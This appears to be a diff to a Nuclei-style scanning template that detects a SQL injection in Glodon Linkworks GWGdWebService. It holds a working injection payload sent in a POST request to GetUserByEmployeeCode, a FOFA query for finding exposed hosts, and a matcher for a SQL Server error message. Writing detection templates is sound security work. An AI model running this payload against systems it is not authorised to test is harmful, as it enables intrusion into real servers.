@@ -1,7 +1,7 @@
 id: glodon-linkworks-sqli
 
 info:
-  name: Glodon Linkworks GWGdWebService SQL injection
+  name: Glodon Linkworks GWGdWebService - SQL injection
   author: DhiyaneshDK
   severity: high
   description: |
@@ -10,8 +10,8 @@ info:
     - https://github.com/zan8in/pocwiki/blob/main/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gwgdwebservice%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
   metadata:
     max-request: 1
-    shodan-query: "Services/Identification/login.ashx"
     verified: true
+    fofa-query: banner="Services/Identification/login.ashx"
   tags: glodon,linkworks,sqli
 
 http:
@@ -19,10 +19,17 @@ http:
       - |
         POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
         Content-Type: application/x-www-form-urlencoded
 
         employeeCode=1'-1/user--'&EncryptData=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==500'
+          - 'contains_any(header, "text/html", "text/plain")'
+          - 'contains_all(body, "在将 nvarchar 值", "转换成数据类型 int 时失败")'
+        condition: and
 
     extractors:
       - type: regex
